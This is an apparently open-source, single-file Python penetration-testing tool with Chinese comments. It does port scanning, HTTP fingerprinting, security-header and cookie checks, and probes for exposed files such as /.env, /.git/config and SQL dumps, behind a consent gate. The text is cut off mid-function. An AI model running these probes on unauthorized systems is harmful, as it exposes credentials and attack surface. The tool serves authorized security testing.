#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""UpClaw — 渗透测试 CLI 工具（单文件版）。

本文件是 upclaw 包全部源码合并而成的自包含单文件版本，
仅使用 Python 标准库，零第三方依赖。可直接运行：

    python upclaw.py --help
    python upclaw.py scan example.com
    python upclaw.py doctor

许可：Apache-2.0 License（全量开源）· 作者：懰襬
仅用于已获得明确书面授权的安全测试。
"""

from __future__ import annotations

__version__ = "0.4.0"
__author__ = "懰襬"

"""通用工具：HTTP 请求、目标解析、并发执行。仅使用标准库。"""


import http.client
import socket
import ssl
import threading
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass, field
from typing import Any, Callable, Iterable


@dataclass
class HttpResponse:
    """统一的 HTTP 响应结构。"""

    url: str = ""
    status: int = 0
    reason: str = ""
    headers: dict[str, str] = field(default_factory=dict)
    body: str = ""
    error: str = ""
    elapsed: float = 0.0

    @property
    def ok(self) -> bool:
        return self.status > 0 and not self.error

    def header(self, name: str) -> str:
        low = name.lower()
        for k, v in self.headers.items():
            if k.lower() == low:
                return v
        return ""


def parse_target(target: str) -> tuple[str, int, str, str]:
    """把用户输入解析为 (host, port, scheme, path)。

    支持：example.com / https://example.com / example.com:8443 / 192.168.1.10
    """
    t = target.strip()
    if not t:
        raise ValueError("目标为空")
    scheme = "https"
    if "://" in t:
        scheme, t = t.split("://", 1)
    else:
        scheme = "https"
    # 去掉路径与查询
    netloc = t.split("/", 1)[0]
    path = ""
    if "/" in t:
        path = "/" + t.split("/", 1)[1]
    if "@" in netloc:
        netloc = netloc.rsplit("@", 1)[1]
    if ":" in netloc:
        host, _, port_s = netloc.partition(":")
        try:
            port = int(port_s)
        except ValueError:
            host, port = netloc, (443 if scheme == "https" else 80)
    else:
        host = netloc
        port = 443 if scheme == "https" else 80
    return host, port, scheme, path


def resolve(host: str) -> str | None:
    try:
        return socket.gethostbyname(host)
    except socket.gaierror:
        return None


def http_request(
    url: str,
    method: str = "GET",
    headers: dict[str, str] | None = None,
    body: str | None = None,
    timeout: float = 6.0,
    follow_redirects: bool = True,
    verify_tls: bool = False,
    user_agent: str = "UpClaw/0.1.0",
    max_redirects: int = 3,
) -> HttpResponse:
    """发起 HTTP(S) 请求。失败时返回带 error 的响应对象而非抛异常。"""
    start = time.time()
    hdrs = {"User-Agent": user_agent, "Accept": "*/*"}
    if headers:
        hdrs.update(headers)

    current = url
    for _ in range(max_redirects + 1):
        try:
            p = urllib.parse.urlparse(current if "://" in current else "https://" + current)
            scheme = p.scheme or "https"
            host = p.hostname or ""
            port = p.port or (443 if scheme == "https" else 80)
            path = p.path or "/"
            if p.query:
                path += "?" + p.query

            ctx = None
            if scheme == "https":
                ctx = ssl.create_default_context()
                if not verify_tls:
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE

            conn = (
                http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx)
                if scheme == "https"
                else http.client.HTTPConnection(host, port, timeout=timeout)
            )
            try:
                conn.request(method, path, body=body, headers=hdrs)
                resp = conn.getresponse()
                raw = resp.read()
                encoding = resp.headers.get_content_charset() or "utf-8"
                try:
                    text = raw.decode(encoding, errors="replace")
                except (LookupError, UnicodeDecodeError):
                    text = raw.decode("utf-8", errors="replace")
                out = HttpResponse(
                    url=current,
                    status=resp.status,
                    reason=resp.reason,
                    headers={k: v for k, v in resp.getheaders()},
                    body=text,
                    elapsed=time.time() - start,
                )
            finally:
                conn.close()

            if follow_redirects and out.status in (301, 302, 303, 307, 308):
                loc = out.header("Location")
                if loc:
                    current = urllib.parse.urljoin(current, loc)
                    continue
            return out

        except socket.timeout:
            return HttpResponse(url=current, error=f"请求超时 ({timeout}s)", elapsed=time.time() - start)
        except ssl.SSLError as e:
            return HttpResponse(url=current, error=f"TLS 错误: {e}", elapsed=time.time() - start)
        except (http.client.HTTPException, OSError) as e:
            return HttpResponse(url=current, error=f"连接失败: {e}", elapsed=time.time() - start)

    return HttpResponse(url=current, error="重定向次数过多", elapsed=time.time() - start)


def tcp_connect(host: str, port: int, timeout: float = 1.5) -> tuple[int, str]:
    """TCP 连接探测，返回 (port, banner)。端口关闭时返回 ('', '')。"""
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            s.settimeout(1.0)
            banner = ""
            try:
                data = s.recv(128)
                banner = data.decode("utf-8", errors="replace").strip()
            except (socket.timeout, OSError):
                pass
            return port, banner
    except (socket.timeout, ConnectionRefusedError, OSError):
        return 0, ""


class RateLimiter:
    """简单的全局速率限制（线程安全）。"""

    def __init__(self, interval: float = 0.0):
        self.interval = interval
        self._lock = threading.Lock()
        self._last = 0.0

    def wait(self) -> None:
        if self.interval <= 0:
            return
        with self._lock:
            now = time.monotonic()
            delta = now - self._last
            if delta < self.interval:
                time.sleep(self.interval - delta)
            self._last = time.monotonic()


def run_parallel(
    func: Callable[[Any], Any],
    items: Iterable[Any],
    threads: int = 16,
    limiter: RateLimiter | None = None,
) -> list[Any]:
    """并发执行并对结果保序过滤（丢弃 None）。"""
    items = list(items)
    if not items:
        return []
    results: list[Any] = []

    def wrapper(it: Any) -> Any:
        if limiter:
            limiter.wait()
        try:
            return func(it)
        except Exception as e:  # noqa: BLE001 - 单个目标失败不影响整体
            return {"error": f"{type(e).__name__}: {e}", "item": it}

    with ThreadPoolExecutor(max_workers=max(1, threads)) as ex:
        for r in ex.map(wrapper, items):
            if r is not None:
                results.append(r)
    return results


def now_iso() -> str:
    import datetime

    return datetime.datetime.now().astimezone().isoformat(timespec="seconds")



"""统一的发现（Finding）数据模型。

核心约定（对应产品"证据优先、拒绝幻觉"理念）：
- status=VERIFIED   ：有可复现的实证输出（响应报文/回显/差异），可进入交付报告。
- status=UNVERIFIED ：仅为线索或可能性，需人工复核，**不进入正式报告正文**。
"""


from datetime import datetime
from typing import Any

SEVERITY_ORDER = ["INFO", "LOW", "MEDIUM", "HIGH", "CRITICAL"]


@dataclass
class Finding:
    id: str = ""
    title: str = ""
    severity: str = "INFO"          # INFO/LOW/MEDIUM/HIGH/CRITICAL
    status: str = "UNVERIFIED"      # VERIFIED / UNVERIFIED
    category: str = ""              # headers / sensitive / sqli / xss / recon / tls
    target: str = ""
    location: str = ""              # URL / 参数 / 端口
    description: str = ""
    evidence: str = ""              # 关键实证片段（会写入报告）
    request: str = ""               # 复现请求（方法 + URL + 参数）
    impact: str = ""
    remediation: str = ""
    references: list[str] = field(default_factory=list)
    cvss: float | None = None
    timestamp: str = field(default_factory=lambda: datetime.now().astimezone().isoformat(timespec="seconds"))

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.id,
            "title": self.title,
            "severity": self.severity,
            "status": self.status,
            "category": self.category,
            "target": self.target,
            "location": self.location,
            "description": self.description,
            "evidence": self.evidence,
            "request": self.request,
            "impact": self.impact,
            "remediation": self.remediation,
            "references": self.references,
            "cvss": self.cvss,
            "timestamp": self.timestamp,
        }


class FindingStore:
    """收集并按严重级别排序的发现仓库。"""

    def __init__(self) -> None:
        self.items: list[Finding] = []

    def add(self, **kw: Any) -> Finding:
        f = Finding(**kw)
        f.id = f"UPCLAW-{len(self.items) + 1:03d}"
        self.items.append(f)
        return f

    def verified(self) -> list[Finding]:
        return [f for f in self.items if f.status == "VERIFIED"]

    def unverified(self) -> list[Finding]:
        return [f for f in self.items if f.status == "UNVERIFIED"]

    def sorted_items(self) -> list[Finding]:
        return sorted(
            self.items,
            key=lambda f: (
                -SEVERITY_ORDER.index(f.severity) if f.severity in SEVERITY_ORDER else 99,
                f.status != "VERIFIED",
            ),
        )

    def counts(self) -> dict[str, int]:
        c = {s: 0 for s in SEVERITY_ORDER}
        for f in self.items:
            if f.severity in c:
                c[f.severity] += 1
        return c



"""配置管理。配置存放于 ~/.upclaw/config.json。

零第三方依赖：使用标准库 json。若使用者手写了扁平的 config.yaml
（key: value 形式），也会作为兜底读取。
"""


import json
import os
import shutil

CONFIG_DIR = os.path.join(os.path.expanduser("~"), ".upclaw")
CONFIG_PATH = os.path.join(CONFIG_DIR, "config.json")
LEGACY_YAML = os.path.join(CONFIG_DIR, "config.yaml")

DEFAULTS: dict[str, Any] = {
    # 扫描行为
    "timeout": 6.0,           # 单次请求超时（秒）
    "threads": 16,            # 并发线程数
    "rate_limit": 0.0,        # 每次请求间隔（秒），0 表示不限
    "user_agent": "UpClaw/0.1.0 (+authorized-security-testing)",
    "max_ports": 1024,        # 单目标最大扫描端口数
    "follow_redirects": True,
    "verify_tls": False,      # 自签证书环境常见，默认不校验但会记录
    # AI 推理（可选，未配置则跳过 AI 相关功能）
    "provider": "",
    "base_url": "",
    "api_key": "",
    "model": "",
    "temperature": 0.2,
    "max_tokens": 4096,
    "proxy": "",
    # 输出
    "output_dir": "reports",
    "format": "html",
}


def ensure_dir() -> str:
    os.makedirs(CONFIG_DIR, exist_ok=True)
    return CONFIG_DIR


def _read_legacy_yaml() -> dict[str, Any]:
    """兜底读取扁平 key: value 的 YAML（仅支持一层，值支持数字/布尔/字符串）。"""
    if not os.path.isfile(LEGACY_YAML):
        return {}
    out: dict[str, Any] = {}
    try:
        with open(LEGACY_YAML, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#") or ":" not in line:
                    continue
                k, v = line.split(":", 1)
                k, v = k.strip(), v.strip().strip('"').strip("'")
                if v.lower() in ("true", "false"):
                    out[k] = v.lower() == "true"
                else:
                    try:
                        out[k] = float(v) if "." in v else int(v)
                    except ValueError:
                        out[k] = v
    except OSError:
        return {}
    return out


def load() -> dict[str, Any]:
    """加载配置：默认值 < config.yaml(兜底) < config.json。"""
    cfg = dict(DEFAULTS)
    cfg.update(_read_legacy_yaml())
    if os.path.isfile(CONFIG_PATH):
        try:
            with open(CONFIG_PATH, "r", encoding="utf-8") as f:
                cfg.update(json.load(f))
        except (json.JSONDecodeError, OSError) as e:
            print(f"[!] 配置文件解析失败，使用默认配置: {e}")
    return cfg


def save(cfg: dict[str, Any]) -> str:
    ensure_dir()
    with open(CONFIG_PATH, "w", encoding="utf-8") as f:
        json.dump(cfg, f, ensure_ascii=False, indent=2)
    return CONFIG_PATH


def get(key: str, default: Any = None) -> Any:
    return load().get(key, default)


def set_value(key: str, value: Any) -> None:
    cfg = load()
    # 类型对齐：若默认值是 int/float/bool，尝试转换
    d = DEFAULTS.get(key)
    if isinstance(d, bool):
        value = str(value).lower() in ("1", "true", "yes", "on")
    elif isinstance(d, int) and not isinstance(d, bool):
        value = int(value)
    elif isinstance(d, float):
        value = float(value)
    cfg[key] = value
    save(cfg)


def reset() -> None:
    if os.path.isfile(CONFIG_PATH):
        bak = CONFIG_PATH + ".bak"
        shutil.copy2(CONFIG_PATH, bak)
        print(f"[i] 已备份原配置到 {bak}")
    save(dict(DEFAULTS))
    print(f"[✓] 配置已重置为默认值: {CONFIG_PATH}")


def init_interactive() -> None:
    """交互式初始化配置。"""
    ensure_dir()
    print("UpClaw 初始化向导（直接回车使用默认值）\n")
    cfg = load()
    prompts = [
        ("timeout", "单次请求超时（秒）"),
        ("threads", "并发线程数"),
        ("rate_limit", "请求间隔（秒，0 不限速）"),
        ("base_url", "模型服务 base_url（可留空，不使用 AI 功能）"),
        ("api_key", "模型服务 api_key（可留空）"),
        ("model", "模型名称（可留空）"),
        ("proxy", "HTTP 代理（可留空）"),
        ("output_dir", "报告输出目录"),
    ]
    for key, desc in prompts:
        cur = cfg.get(key, DEFAULTS.get(key, ""))
        try:
            val = input(f"  {desc} [{cur}]: ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[i] 已取消，保留现有配置。")
            return
        if val:
            try:
                set_value(key, val)
            except ValueError:
                print(f"  [!] {key} 输入无效，保留原值")
    print(f"\n[✓] 配置已保存到 {CONFIG_PATH}")



"""授权合规确认模块。

这是 UpClaw 的法律底线：**任何扫描动作执行前，必须确认使用者已获得目标所有者的
明确书面授权**。未通过确认的目标一律拒绝扫描。

设计原则：
1. 默认拒绝 —— 未确认即不执行，不存在"静默跳过"。
2. 显式确认 —— 需要使用者主动输入确认，而非默认同意。
3. 可审计 —— 每次确认都记录时间、目标与确认方式，留存于 ~/.upclaw/consent.log。
4. 可非交互 —— CI/自动化场景通过 --yes 配合已记录的授权文件使用，仍需授权文件存在。
"""


import hashlib
import sys

CONFIRM_PHRASE = "我已获得授权"
LEGAL_NOTICE = (
    "依据《网络安全法》《数据安全法》《刑法》第 285-287 条，\n"
    "对未获授权的计算机信息系统进行扫描、探测、渗透均属违法。"
)


def _consent_log_path() -> str:
    return os.path.join(os.path.expanduser("~"), ".upclaw", "consent.log")


def _ensure_dir() -> None:
    d = os.path.join(os.path.expanduser("~"), ".upclaw")
    os.makedirs(d, exist_ok=True)


def target_fingerprint(targets: list[str]) -> str:
    """对目标集合生成稳定指纹，用于记录与复用确认。"""
    joined = "|".join(sorted(t.strip().lower() for t in targets))
    return hashlib.sha256(joined.encode("utf-8")).hexdigest()[:16]


def record_consent(targets: list[str], method: str, note: str = "") -> str:
    """写入一条不可否认的确认记录，返回记录 ID。"""
    _ensure_dir()
    fp = target_fingerprint(targets)
    entry = {
        "ts": datetime.now().astimezone().isoformat(timespec="seconds"),
        "unix": int(time.time()),
        "fingerprint": fp,
        "targets": list(targets),
        "method": method,          # interactive | auth-file | flag
        "note": note,
        "pid": os.getpid(),
    }
    rid = f"{entry['unix']}-{fp}"
    entry["id"] = rid
    with open(_consent_log_path(), "a", encoding="utf-8") as f:
        f.write(json.dumps(entry, ensure_ascii=False) + "\n")
    return rid


def load_auth_file(path: str) -> dict | None:
    """读取使用者提供的授权文件（JSON）。

    期望字段：
    {
      "authorized_by": "目标所有者/授权人",
      "scope": ["example.com", "192.168.1.0/24"],
      "valid_until": "2026-12-31",     // 可选
      "reference": "合同编号 / SRC 平台授权记录"
    }
    """
    try:
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
    except FileNotFoundError:
        raise SystemExit(f"[!] 授权文件不存在: {path}")
    except json.JSONDecodeError as e:
        raise SystemExit(f"[!] 授权文件不是合法 JSON: {e}")

    if not isinstance(data, dict) or "authorized_by" not in data:
        raise SystemExit("[!] 授权文件缺少必要字段: authorized_by")
    if "scope" not in data or not isinstance(data["scope"], list):
        raise SystemExit("[!] 授权文件缺少必要字段: scope（授权目标列表）")

    vu = data.get("valid_until")
    if vu:
        try:
            if datetime.fromisoformat(vu) < datetime.now():
                raise SystemExit(f"[!] 授权文件已过期（valid_until={vu}）")
        except ValueError:
            raise SystemExit(f"[!] 授权文件 valid_until 格式非法（应为 YYYY-MM-DD）")
    return data


def _hostport(entry: str) -> str:
    """把 URL 或主机串规整为 host[:port]。

    http://a.example.com:8080/x?y=1  ->  a.example.com:8080
    https://Example.COM/             ->  example.com
    user@host/path                   ->  host
    """
    s = (entry or "").strip().lower()
    if "://" in s:
        s = s.split("://", 1)[1]
    s = s.split("/", 1)[0].split("?", 1)[0]
    if "@" in s:
        s = s.rsplit("@", 1)[1]
    if s.startswith("[") and "]" in s:  # IPv6 字面量
        rest = s[s.index("]") + 1 :]
        return s[1 : s.index("]")] + rest
    return s


def _host_of(hostport: str) -> str:
    """从 host[:port] 中取出 host（兼容 IPv6）。"""
    if hostport.startswith("["):
        return hostport[1 : hostport.index("]")] if "]" in hostport else hostport
    return hostport.split(":")[0]


def _normalize_scope(raw: object) -> str:
    """规整 scope 条目；CIDR 网段（如 192.168.1.0/24）原样保留。"""
    s = str(raw or "").strip().lower()
    if "/" in s and "://" not in s:
        try:
            import ipaddress

            ipaddress.ip_network(s, strict=False)
            return s  # 合法 CIDR，保留
        except ValueError:
            pass
    return _hostport(s)


def _in_scope(target: str, scope: list[str]) -> bool:
    """判断目标是否落在授权范围内。

    支持三种 scope 写法：
      1. 域名        example.com      → 匹配自身及所有子域名
      2. 主机[:端口]  127.0.0.1:8888   → 精确匹配（带端口则端口须一致）
      3. CIDR 网段   192.168.1.0/24   → 按网段匹配
    """
    t = _hostport(target)
    t_host = _host_of(t)
    if not t_host:
        return False

    for raw in scope:
        s = _normalize_scope(raw)
        if not s:
            continue

        # 3) CIDR 网段
        if "/" in s:
            try:

                if ipaddress.ip_address(t_host) in ipaddress.ip_network(s, strict=False):
                    return True
            except ValueError:
                pass
            continue

        # 2) 带端口：精确匹配 host:port
        if ":" in s:
            if t == s:
                return True
            continue

        # 1) 域名/IP：精确或子域匹配
        if t_host == s or t_host.endswith("." + s):
            return True
    return False


def _targets_in_scope(targets: list[str], scope: list[str]) -> list[str]:
    """返回不在授权范围内的目标。"""
    return [t for t in targets if not _in_scope(t, scope)]


def print_warning(targets: list[str]) -> None:
    print("=" * 66, file=sys.stderr)
    print("  授权确认 / AUTHORIZATION REQUIRED", file=sys.stderr)
    print("=" * 66, file=sys.stderr)
    print(f"  即将对以下 {len(targets)} 个目标执行安全检测：", file=sys.stderr)
    for t in targets:
        print(f"    • {t}", file=sys.stderr)
    print(file=sys.stderr)
    print(f"  {LEGAL_NOTICE}", file=sys.stderr)
    print("=" * 66, file=sys.stderr)


def require_authorization(
    targets: list[str],
    assume_yes: bool = False,
    auth_file: str | None = None,
) -> bool:
    """执行前授权门禁。返回 True 表示放行，否则终止程序。

    优先级：
      1. 提供 --auth-file → 校验目标是否落在授权范围内并直接放行（可非交互）。
      2. 交互式确认 → 输入确认短语后放行。
      3. --yes 但无任何授权凭据 → 拒绝（防止"一键跳过"绕过合规）。
    """
    if not targets:
        return False

    # 1) 授权文件模式
    if auth_file:
        data = load_auth_file(auth_file)
        out_of_scope = _targets_in_scope(targets, data.get("scope", []))
        if out_of_scope:
            raise SystemExit(
                "[!] 以下目标不在授权文件 scope 范围内，已拒绝执行：\n"
                + "\n".join(f"    • {t}" for t in out_of_scope)
                + "\n    请更新授权文件的 scope，或移除这些目标。"
            )
        rid = record_consent(targets, "auth-file", data.get("reference", ""))
        print(
            f"[✓] 授权文件校验通过（授权人: {data.get('authorized_by')}，记录: {rid}）",
            file=sys.stderr,
        )
        return True

    # 2) --yes 但无授权文件：拒绝
    if assume_yes:
        raise SystemExit(
            "[!] 已拒绝执行。\n"
            "    --yes 不能替代授权：非交互场景请使用 --auth-file 提供授权文件。\n"
            "    示例: upclaw scan example.com --auth-file ./authorization.json"
        )

    # 3) 非 TTY 环境无法交互确认
    if not sys.stdin or not sys.stdin.isatty():
        raise SystemExit(
            "[!] 非交互环境无法进行授权确认，已拒绝执行。\n"
            "    请使用 --auth-file 提供授权文件后再运行。"
        )

    # 4) 交互式确认
    print_warning(targets)
    try:
        ans = input(f'  请确认你已获得上述目标的书面授权，输入「{CONFIRM_PHRASE}」继续: ')
    except (EOFError, KeyboardInterrupt):
        print("\n[!] 已取消。", file=sys.stderr)
        return False

    if ans.strip() != CONFIRM_PHRASE:
        print("\n[!] 确认短语不匹配，已拒绝执行。", file=sys.stderr)
        return False

    rid = record_consent(targets, "interactive")
    print(f"[✓] 授权确认已记录（记录 ID: {rid}）\n", file=sys.stderr)
    return True



"""信息收集（Recon）：端口扫描、服务指纹、HTTP 指纹、常见路径探测。

所有动作均为非破坏性只读探测。
"""


import re


# 常见端口（覆盖 Web、数据库、运维、邮件等高频服务）
COMMON_PORTS = [
    21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 465, 587,
    993, 995, 1025, 1080, 1433, 1521, 1723, 2049, 2082, 2083, 2181, 2375,
    3128, 3306, 3389, 3690, 4443, 5000, 5432, 5601, 5900, 5984, 6379,
    6443, 7001, 8000, 8008, 8009, 8080, 8081, 8088, 8161, 8443, 8500,
    8545, 8888, 9000, 9001, 9090, 9200, 9300, 9418, 9443, 11211, 15672,
    27017, 28017, 50000,
]

# 端口 → 服务名（用于报告可读性）
PORT_SERVICE = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 80: "HTTP",
    110: "POP3", 111: "RPCbind", 135: "MSRPC", 139: "NetBIOS", 143: "IMAP",
    443: "HTTPS", 445: "SMB", 465: "SMTPS", 587: "SMTP", 993: "IMAPS",
    995: "POP3S", 1080: "SOCKS", 1433: "MSSQL", 1521: "Oracle", 1723: "PPTP",
    2049: "NFS", 2181: "ZooKeeper", 2375: "Docker", 3128: "Proxy",
    3306: "MySQL", 3389: "RDP", 3690: "SVN", 4443: "HTTPS-Alt",
    5000: "Flask/UPnP", 5432: "PostgreSQL", 5601: "Kibana", 5900: "VNC",
    5984: "CouchDB", 6379: "Redis", 6443: "K8s-API", 7001: "WebLogic",
    8000: "HTTP-Alt", 8009: "AJP", 8080: "HTTP-Proxy", 8081: "HTTP-Alt",
    8161: "ActiveMQ", 8443: "HTTPS-Alt", 8500: "Consul", 8545: "Ethereum",
    8888: "HTTP-Alt", 9000: "HTTP-Alt", 9090: "Prometheus", 9200: "Elasticsearch",
    9300: "Elasticsearch", 9418: "Git", 9443: "HTTPS-Alt", 11211: "Memcached",
    15672: "RabbitMQ", 27017: "MongoDB", 28017: "MongoDB-Web", 50000: "SAP",
}

# 常见敏感/信息泄露路径
SENSITIVE_PATHS = [
    "/.git/config", "/.git/HEAD", "/.svn/entries", "/.env", "/.DS_Store",
    "/web.config", "/WEB-INF/web.xml", "/composer.json", "/package.json",
    "/phpinfo.php", "/info.php", "/test.php", "/.htaccess",
    "/backup.sql", "/db.sql", "/database.sql", "/dump.sql",
    "/admin", "/admin/login", "/administrator", "/login", "/manager/html",
    "/actuator", "/actuator/env", "/console", "/debug", "/trace",
    "/server-status", "/status", "/metrics", "/health",
    "/swagger", "/swagger-ui.html", "/api-docs", "/v2/api-docs", "/graphql",
    "/robots.txt", "/sitemap.xml", "/crossdomain.xml", "/.well-known/security.txt",
    "/config.php.bak", "/.idea/workspace.xml", "/.vscode/settings.json",
]

# 安全响应头基线
SECURITY_HEADERS = [
    "Content-Security-Policy",
    "X-Frame-Options",
    "X-Content-Type-Options",
    "Strict-Transport-Security",
    "Referrer-Policy",
    "Permissions-Policy",
    "X-XSS-Protection",
]


def scan_ports(
    host: str,
    ports: list[int] | None = None,
    timeout: float = 1.5,
    threads: int = 50,
    max_ports: int = 1024,
) -> list[dict[str, Any]]:
    """TCP 全连接扫描，返回开放端口列表（含服务名与 banner）。"""
    ip = resolve(host)
    if not ip:
        return []
    port_list = (ports or COMMON_PORTS)[:max_ports]
    limiter = RateLimiter(0.0)

    results = run_parallel(
        lambda p: tcp_connect(ip, p, timeout),
        port_list,
        threads=threads,
        limiter=limiter,
    )
    open_ports = []
    for item in results:
        if isinstance(item, dict):  # 异常情况
            continue
        port, banner = item
        if port:
            open_ports.append(
                {
                    "port": port,
                    "service": PORT_SERVICE.get(port, "unknown"),
                    "banner": banner[:200],
                }
            )
    return sorted(open_ports, key=lambda x: x["port"])


def fingerprint(url: str, cfg: dict[str, Any]) -> dict[str, Any]:
    """HTTP 指纹：状态码、Server、标题、技术栈线索、安全响应头。"""
    resp = http_request(
        url,
        timeout=float(cfg.get("timeout", 6.0)),
        follow_redirects=bool(cfg.get("follow_redirects", True)),
        verify_tls=bool(cfg.get("verify_tls", False)),
        user_agent=str(cfg.get("user_agent", "UpClaw/0.1.0")),
    )
    info: dict[str, Any] = {
        "url": url,
        "final_url": resp.url,
        "status": resp.status,
        "server": resp.header("Server"),
        "powered_by": resp.header("X-Powered-By"),
        "title": "",
        "technologies": [],
        "security_headers": {},
        "missing_security_headers": [],
        "cookies": [],
        "error": resp.error,
        "elapsed": round(resp.elapsed, 3),
    }
    if not resp.ok:
        return info

    m = re.search(r"<title[^>]*>(.*?)</title>", resp.body, re.I | re.S)
    if m:
        info["title"] = m.group(1).strip()[:120]

    # 技术栈线索（基于响应头与页面特征）
    blob = (resp.body or "")[:200000].lower()
    heads = " ".join(f"{k.lower()}:{v.lower()}" for k, v in resp.headers.items())
    hints = {
        "Nginx": ("nginx" in heads or "nginx" in blob),
        "Apache": ("apache" in heads),
        "IIS": ("microsoft-iis" in heads),
        "PHP": (".php" in blob or "x-powered-by: php" in heads),
        "ASP.NET": ("asp.net" in heads or "__viewstate" in blob),
        "Java/Spring": ("spring" in heads or "jsessionid" in heads or "/actuator" in blob),
        "Django": ("csrftoken" in heads or "django" in blob),
        "Laravel": ("laravel_session" in heads or "laravel" in blob),
        "React": ("react" in blob or "__next_data__" in blob),
        "Vue": ("vue.js" in blob or "data-v-" in blob),
        "jQuery": ("jquery" in blob),
        "WordPress": ("wp-content" in blob or "wp-includes" in blob),
        "Bootstrap": ("bootstrap" in blob),
        "Cloudflare": ("cloudflare" in heads),
    }
    info["technologies"] = [k for k, v in hints.items() if v]

    for h in SECURITY_HEADERS:
        val = resp.header(h)
        info["security_headers"][h] = val
        if not val:
            info["missing_security_headers"].append(h)

    sc = resp.header("Set-Cookie")
    if sc:
        for c in sc.split(","):
            c = c.strip()
            if not c:
                continue
            name = c.split("=")[0]
            info["cookies"].append(
                {
                    "name": name,
                    "httponly": "httponly" in c.lower(),
                    "secure": "secure" in c.lower(),
                    "samesite": ("samesite" in c.lower()),
                }
            )
    return info


def probe_paths(
    base_url: str,
    paths: list[str] | None = None,
    cfg: dict[str, Any] | None = None,
    threads: int = 12,
) -> list[dict[str, Any]]:
    """探测常见路径，返回可访问（非 404）的条目。"""
    cfg = cfg or {}
    paths = paths or SENSITIVE_PATHS
    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)))
    # 关键：基准必须是 scheme://host[:port]，需剥离原 URL 的查询串与路径。
    # 否则当目标形如 /reflect?name=test 时会拼成 ?name=test/.env，
    # 导致所有路径都被同一接口接管 → 全部返回 200 → 严重误报。
    _pu = urllib.parse.urlparse(base_url)
    base = f"{_pu.scheme or 'https'}://{_pu.netloc}".rstrip("/")

    def probe(p: str) -> dict[str, Any] | None:
        r = http_request(
            base + p,
            timeout=float(cfg.get("timeout", 6.0)),
            follow_redirects=False,
            verify_tls=bool(cfg.get("verify_tls", False)),
            user_agent=str(cfg.get("user_agent", "UpClaw/0.1.0")),
        )
        if r.error or r.status == 0:
            return None
        return {
            "path": p,
            "status": r.status,
            "length": len(r.body),
            "snippet": (r.body or "")[:160].replace("\n", " ")[:160],
            "risky": _is_risky_path(p, r),
        }

    out = run_parallel(probe, paths, threads=threads, limiter=limiter)
    return [o for o in out if isinstance(o, dict)]


def _is_risky_path(path: str, resp: Any) -> bool:
    """判断命中的路径是否属于高危暴露。"""
    p = path.lower()
    high = (
        ".git", ".svn", ".env", "backup", ".sql", "web-inf", "phpinfo",
        "actuator", "console", "dump", "config.php.bak", ".idea", ".vscode",
    )
    if any(h in p for h in high):
        return resp.status == 200
    if "server-status" in p or "metrics" in p:
        return resp.status == 200
    return False



"""安全响应头、Cookie 属性与信息泄露检查。

全部为**确定性检查**：结论直接来自响应头，均为 VERIFIED。
"""




# 头部缺失的风险映射
HEADER_RISK = {
    "Content-Security-Policy": ("MEDIUM", "缺少 CSP，页面易受 XSS 与数据注入攻击"),
    "X-Frame-Options": ("MEDIUM", "缺少 X-Frame-Options，页面可能被嵌套用于点击劫持"),
    "X-Content-Type-Options": ("LOW", "缺少 X-Content-Type-Options，浏览器可能进行 MIME 嗅探"),
    "Strict-Transport-Security": ("MEDIUM", "缺少 HSTS，用户可能被降级到 HTTP 并遭受中间人攻击"),
    "Referrer-Policy": ("LOW", "缺少 Referrer-Policy，可能导致敏感 URL 泄露给第三方"),
    "Permissions-Policy": ("LOW", "缺少 Permissions-Policy，未限制浏览器敏感特性"),
    "X-XSS-Protection": ("INFO", "缺少 X-XSS-Protection（现代浏览器已弃用，仅作兼容提示）"),
}


def _run_headers(store: FindingStore, url: str, fp: dict[str, Any]) -> None:
    """基于 fingerprint 结果生成安全头相关发现。"""
    if fp.get("error"):
        return

    # 1) 缺失的安全响应头（按等级合并为一条，避免报告噪音）
    missing = fp.get("missing_security_headers") or []
    if missing:
        worst = max(
            (HEADER_RISK.get(h, ("INFO", ""))[0] for h in missing),
            key=lambda s: ["INFO", "LOW", "MEDIUM", "HIGH", "CRITICAL"].index(s),
        )
        detail = "\n".join(f"  - {h}: {HEADER_RISK.get(h, ('', '未设置'))[1]}" for h in missing)
        store.add(
            title=f"缺失 {len(missing)} 项安全响应头",
            severity=worst,
            status="VERIFIED",
            category="headers",
            target=url,
            location=url,
            description="目标响应中缺少以下安全响应头，削弱了浏览器侧的防护能力：",
            evidence=detail,
            request=f"GET {url}",
            impact="降低对 XSS、点击劫持、MIME 嗅探等客户端攻击的防御能力。",
            remediation="在 Web 服务器或应用层补充相应响应头。Nginx 示例：\n"
                        "  add_header X-Frame-Options \"SAMEORIGIN\" always;\n"
                        "  add_header X-Content-Type-Options \"nosniff\" always;\n"
                        "  add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains\" always;\n"
                        "  add_header Content-Security-Policy \"default-src 'self'\" always;",
            references=["https://owasp.org/www-project-secure-headers/"],
        )

    # 2) Cookie 安全属性
    insecure = [c for c in (fp.get("cookies") or []) if not (c.get("httponly") and c.get("secure"))]
    if insecure:
        lines = []
        for c in insecure:
            miss = []
            if not c.get("httponly"):
                miss.append("HttpOnly")
            if not c.get("secure"):
                miss.append("Secure")
            if not c.get("samesite"):
                miss.append("SameSite")
            lines.append(f"  - {c.get('name')}: 缺少 {'/'.join(miss)}")
        has_httponly_missing = any(not c.get("httponly") for c in insecure)
        store.add(
            title=f"{len(insecure)} 个 Cookie 安全属性不完整",
            severity="MEDIUM" if has_httponly_missing else "LOW",
            status="VERIFIED",
            category="headers",
            target=url,
            location=url,
            description="Set-Cookie 响应头中的 Cookie 未设置完整的安全属性：",
            evidence="\n".join(lines),
            request=f"GET {url}",
            impact="缺少 HttpOnly 会使 Cookie 可被 JS 读取（放大 XSS 危害）；"
                   "缺少 Secure 会在 HTTP 下明文传输；缺少 SameSite 增加 CSRF 风险。",
